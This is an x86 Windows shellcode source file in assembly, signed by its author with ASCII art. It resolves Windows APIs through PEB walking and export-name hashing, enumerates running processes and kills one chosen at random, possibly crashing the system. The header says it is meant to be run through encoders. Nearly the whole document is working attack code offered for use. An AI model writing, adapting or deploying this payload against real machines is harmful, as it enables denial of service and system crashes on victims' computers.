;
;                             N
;                          A
;                       I     E _ 
;                    S     T  _-' "'-,     
;                 S     T  _-' | d$$b |  
;              S     E  _-'    | $$$$ |    
;           U     L  _-'       | Y$$P |  
;        R     U  _-'|         |      |
;           O  _-'  _*         |      |
;        R  _-' |_-"      __--''\    /
;        _-'         __--'     __*--'
;      -'       __-''    __--*__-"`
;     |    _--''   __--*"__-'`  
;     |_--"  .--=`"__-||"  
;     |      |  |\\   ||
;     | .dUU |  | \\ //
;     | UUUU | _|___//
;     | UUUU |  |   
;     | UUUU |  |         [Matzec]
;     | UUUU |  |
;     | UUUU |  |
;     | UUUU |  |
;     | UUP' |  |
;     |   ___^-"`
;      ""'          
; 
; This shellcode is admittedly kinda boring. But it can produce pretty funny
; results nonetheless.
;
; Enumerate all running processes on the system and kill a random process. You
; might kill yourself. Or you might kill ntoskrnl.exe! Who knows!
;
; This has the potential to bluescreen a system. So, be careful. :)
;
; 463 bytes, null bytes all over the place. Intended for use with encoders.
;
; frank2 <frank2 [D] dc949 [K] org>

      global main

_main:
      jmp   dataOffset

getFuncByHash:
      mov   esi,[esp+8]
      mov   edi,[esi+0x3C]       ; dos->e_lfanew 
      add   edi,esi
      mov   ecx,[edi+0x78]       ; export data 
      add   ecx,esi
      mov   ebx,[ecx+0x20]       ; AddressOfNames 
      add   ebx,esi
      xor   eax,eax
      push  ecx

searchForFunc:
      mov   edx,[ebx+eax*4]
      add   edx,esi
      mov   edi,0x554E4441

hashString:
      movzx ecx,byte [edx]
      test  ecx,ecx
      jz    short finishHash

rolRolFightDaPowa:
      xor   edi,ecx
      rol   edi,cl
      shr   ecx,1
      jnz   short rolRolFightDaPowa
      inc   edx
      jmp   short hashString

finishHash:
      or    edi,0x10101010
      cmp   edi,[esp+8]
      jz    short foundHash
      inc   eax
      jmp   short searchForFunc

foundHash:
      pop   ebx
      mov   edi,[ebx+0x1c]
      add   edi,esi
      mov   ebx,[ebx+0x24]
      add   ebx,esi
      movzx ebx,word [ebx+eax*2]
      mov   ebx,[edi+ebx*4]
      add   ebx,esi
      pop   eax                        ; fix the stack 
      pop   edx                        ; no idea why I did it this way 
      pop   edx                        ; but I had some reason... 
      push  eax                        ; it had to do with null bytes 
      ret                        

beginCode:
      pop   ebp
      xor   ecx,ecx
      mov   esi,[fs:ecx+0x30]          ; PEB 
      mov   esi,[esi+0xC]              ; Ldr 
      mov   esi,[esi+0xC]              ; linked list of loaded modules 
      mov   esi,[esi]                  ; loader info for ntdll.dll 
      push  dword [esi+0x18]           ; ntdll.dll image data 
      mov   esi,[esi]                  ; loader info for kernel32.dll 
      push  dword [esi+0x18]           ; kernel32.dll image data 
      push  dword [esp]                ; "                     " 
      push  dword [ebp]                ; ExitThread hash 
      call  getFuncByHash
      cmp   dword [ebx],0x4C44544E     ; if this is the real ExitThread, it 
                                       ;    won't start with NTDL 
      jnz   hasExitThread              ; we have ExitThread, resume 
      push  dword [esp+4]              ; ntdll.dll image data 
      push  dword [ebp+4]              ; RtlExitUserThread hash 
      call  getFuncByHash

hasExitThread:
      mov   [ebp],ebx                  ; store the exit func here 

      push  dword [esp]                ; kernel32.dll image data 
      push  dword [ebp+8]              ; LoadLibraryA hash 
      call  getFuncByHash
      mov   [ebp+8],ebx                ; store LoadLibraryA function 

      push  dword [esp]                ; kernel32.dll image data 
      push  dword [ebp+0xC]            ; OpenProcess hash 
      call  getFuncByHash
      mov   [ebp+0xC],ebx              ; store OpenProcess function 

      push  dword [esp]                ; kernel32.dll image data 
      push  dword [ebp+0x10]           ; TerminateProcess hash 
      call  getFuncByHash
      mov   [ebp+0x10],ebx             ; store TerminateProcess function 

      pop   ebx                        ; get kernel32 off the stack 
      lea   eax,[ebp+0x30]             ; msvcrt.dll 
      push  eax
      call  [ebp+8]                    ; load msvcrt.dll 

      push  eax                        ; push the library onto the stack 
      push  dword [esp]                ; msvcrt.dll image data 
      push  dword [ebp+0x14]           ; malloc hash 
      call  getFuncByHash
      mov   [ebp+0x14],ebx             ; store malloc function 

      push  dword [esp]                ; msvcrt.dll image data 
      push  dword [ebp+0x18]           ; FREE HASH 
      call  getFuncByHash
      mov   [ebp+0x18],ebx             ; PUT HASH BACK 

      push  dword [esp]                ; msvcrt.dll image data 
      push  dword [ebp+0x1C]           ; srand hash 
      call  getFuncByHash
      mov   [ebp+0x1C],ebx             ; store srand function 

      push  dword [esp]                ; msvcrt.dll image data 
      push  dword [ebp+0x20]           ; rand hash 
      call  getFuncByHash
      mov   [ebp+0x20],ebx             ; store rand function 

      push  dword [esp]                ; msvcrt.dll image data 
      push  dword [ebp+0x24]           ; time hash 
      call  getFuncByHash
      mov   [ebp+0x24],ebx             ; store time function 

      pop   ebx                        ; take msvcrt.dll off the stack 
      lea   eax,[ebp+0x3B]             ; psapi.dll 
      push  eax
      call  [ebp+8]                    ; load psapi.dll 

      push  eax                        ; psapi.dll image data 
      push  dword [ebp+0x28]           ; EnumProcesses hash 
      call  getFuncByHash
      mov   [ebp+0x28],ebx             ; store EnumProcesses function

      push  0x1000
      call  [ebp+0x14]                 ; allocate data for pProcessIds 
      push  eax                        ; push the buffer onto the stack 
      lea   eax,[ebp+0x2C]             ; address for pBytesReturned 
      push  eax                        ; pBytesReturned 
      push  0x1000                     ; cb 
      push  dword [esp+8]              ; pProcessIds 
      call  [ebp+0x28]                 ; EnumProcesses(buf, 0x1000, &returned) 
      test  eax,eax
      jz    bailOut                    ; EnumProcesses failed, bail. 

      shr   dword [ebp+0x2C],2         ; number of process IDs 
      xor   ebx,ebx
      push  ebx
      call  [ebp+0x24]                 ; get current time, which, rudely, 
      push  eax                        ; is __cdecl
      call  [ebp+0x1C]                 ; use the time to seed the prng which,
      add   esp,8                      ; also rudely, is __cdecl 

rouletteRoutine:
      call  [ebp+0x20]                 ; rand() 
      xor   edx,edx
      idiv  dword [ebp+0x2C]           ; rand() % number of processes 
      mov   esi,[esp]                  ; get the process id buffer 
      lea   esi,[esi+edx*4]            ; load the address of the target proc id 

      push  dword [esi]                ; dwProcessId 
      push  ebx                        ; bInheritHandle (FALSE) 
      push  0x411                      ; query information, read, terminate 
      call  [ebp+0xC]                  ; open the process 
      test  eax,eax
      jz    rouletteRoutine            ; open process failed, try again 

      push  ebx                        ; uExitCode 
      push  eax                        ; hProcess 
      call  [ebp+0x10]                 ; kill the process 
      test  eax,eax
      jz    rouletteRoutine            ; termination failed, try another one. 

bailOut:
      push  dword [esp]
      call  [ebp+0x18]                 ; free the malloc'd buffer 

      xor   eax,eax
      push  eax
      call  [ebp]                      ; exit the thread 
   
dataOffset:
      call  beginCode

      dd    0x58159F36                 ; ExitThread
      dd    0x795D941E                 ; RtlExitUserThread
      dd    0xF816FF93                 ; LoadLibraryA
      dd    0xD4BF9875                 ; OpenProcess
      dd    0x78F07775                 ; TerminateProcess
      dd    0xFDFE9E13                 ; malloc
      dd    0xBC5271BA                 ; free
      dd    0x73F6D750                 ; srand  
      dd    0xDCF432F0                 ; rand
      dd    0x7CD4B1FE                 ; time
      dd    0xB4599692                 ; EnumProcesses
      dd    0x554E4441                 ; place to store number of processes
      db    "msvcrt.dll",0
      db    "psapi.dll",0
